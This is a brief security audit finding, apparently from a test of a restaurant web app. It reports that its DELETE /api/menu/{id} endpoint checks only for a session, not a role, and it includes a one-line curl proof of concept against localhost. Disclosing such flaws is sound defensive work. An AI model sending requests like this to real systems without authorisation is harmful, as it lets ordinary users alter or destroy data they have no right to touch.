# H6 — Broken Function-Level Auth: Menu Item Delete (V11)

**Severity:** High  
**CWE:** CWE-285 | **OWASP:** A01:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-011-v11-broken-fn-auth-delete.md`

## Summary

`DELETE /api/menu/{id}` only checks for session presence. No role check. Any logged-in user can soft-delete any menu item.

## PoC

```bash
curl -X DELETE http://localhost:4443/api/menu/1 -H "Cookie: restaurant_session=<alice_session>"
# Response: {"message":"item removed from menu"}
```
